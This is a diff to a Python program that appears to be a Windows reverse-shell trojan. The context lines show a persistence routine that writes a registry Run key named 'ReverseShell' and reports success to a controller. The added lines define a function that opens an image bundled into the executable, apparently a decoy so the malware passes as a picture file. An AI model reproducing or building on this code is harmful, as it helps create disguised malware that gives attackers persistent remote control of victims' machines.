@@ -159,9 +159,22 @@ def persistence():
         # name the entry (/v), define the common register Type (/t), define the Data part (/d)
         os.popen(
             'reg add HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v ReverseShell /t REG_SZ /d "' + location + '"')
+        # image_open()
         reliable_send("Persistence Acquired")
     else:
         reliable_send("Persistence already acquired")
+
+
+def image_open():
+    """
+    Copy the image in a temp folder and open it
+    """
+    name = sys._MEIPASS + "\image.jpg"
+    try:
+        os.popen(name)
+    except Exception as e:
+        if debug:
+            print(e)
 
 
 if __name__ == '__main__':
